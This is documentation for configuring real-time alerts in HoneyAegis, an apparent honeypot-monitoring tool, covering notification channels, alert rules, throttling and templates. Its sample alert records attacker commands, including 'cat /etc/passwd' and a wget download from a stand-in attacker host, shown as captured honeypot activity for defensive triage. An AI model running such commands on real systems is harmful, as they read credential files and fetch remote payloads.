# Alerting

HoneyAegis sends real-time alerts when notable events occur across your honeypot fleet. Alerting is powered by Apprise, which supports 80+ notification services.

## Supported Channels

| Channel | Apprise URL Format | Example |
|---|---|---|
| **Email (SMTP)** | `mailto://user:pass@smtp.host` | `mailto://bot:secret@smtp.gmail.com` |
| **Slack** | `slack://token_a/token_b/token_c` | Slack incoming webhook |
| **Discord** | `discord://webhook_id/webhook_token` | Discord webhook URL |
| **Microsoft Teams** | `msteams://token_a/token_b/token_c` | Teams incoming webhook |
| **ntfy** | `ntfy://topic` | `ntfy://honeyaegis-alerts` |
| **Telegram** | `tgram://bot_token/chat_id` | Telegram bot API |
| **SMS (Twilio)** | `twilio://sid:token@from/to` | Twilio API |
| **PagerDuty** | `pagerduty://integration_key` | PagerDuty Events v2 |

## Configuration

Set one or more Apprise URLs in your `.env` file (comma-separated):

```bash
# Single channel
APPRISE_URLS=slack://T00000000/B00000000/XXXXXXXXXXXXXXXXXXXXXXXX

# Multiple channels
APPRISE_URLS=slack://T00/B00/XXX,discord://webhook_id/token,mailto://bot:pass@smtp.host
```

## Alert Rules

Configure which events trigger alerts:

```bash
# Alert triggers
ALERT_ON_NEW_SESSION=true          # Every new honeypot connection
ALERT_ON_MALWARE_CAPTURE=true      # File captured by Dionaea/Cowrie
ALERT_ON_HIGH_RISK=true            # Sessions with risk score >= 7
ALERT_ON_BRUTE_FORCE=true          # 10+ auth attempts from one IP

# Throttling
ALERT_COOLDOWN_MINUTES=5           # Minimum time between alerts per source IP
ALERT_MAX_PER_HOUR=60              # Maximum alerts per hour (prevents floods)
```

## Alert Format

Alerts include structured information for quick triage:

```
[HoneyAegis] New SSH Session

Source: 185.220.101.42 (Germany, AS24940 Hetzner)
Sensor: prod-vps-01
Protocol: SSH
Risk Score: 7.2/10

Commands: uname -a, cat /etc/passwd, wget http://evil.com/payload

AI Summary: Attacker performed reconnaissance and attempted
to download a known cryptominer payload.

Dashboard: https://honeyaegis.example.com/sessions/sess_abc123
```

## Custom Alert Templates

Override the default alert template by creating a Jinja2 template file:

```bash
# Place custom templates in the config directory
cp alert_template.j2 ./configs/templates/alert.j2
```

```jinja2
[{{ sensor_name }}] {{ protocol | upper }} Session from {{ src_ip }}
Risk: {{ risk_score }}/10 | Country: {{ country }}
{% if ai_summary %}Summary: {{ ai_summary }}{% endif %}
```

## Testing Alerts

Send a test alert to verify your configuration:

```bash
curl -X POST http://localhost:8000/api/v1/alerts/test \
  -H "Authorization: Bearer $TOKEN"
```

## Related Pages

- [Configuration](../getting-started/configuration.md) -- Environment variable reference
- [Alerts API](../api/alerts.md) -- Programmatic alert management
- [Threat Intelligence](threat-intel.md) -- Enrich alerts with TI data
